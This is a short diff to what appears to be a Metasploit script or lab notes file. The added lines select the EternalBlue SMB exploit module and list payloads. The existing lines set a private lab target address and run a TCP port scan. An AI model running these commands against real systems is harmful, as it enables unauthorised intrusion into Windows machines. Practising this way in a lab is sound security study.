@@ -1,3 +1,13 @@
+# select exploit
+
+use exploit/windows/smb/ms17_010_eternalblue
+
+# check
+
+show payloads
+
+# set
+
 setg rhosts 10.10.148.128
 use auxiliary/scanner/portscan/tcp
 run
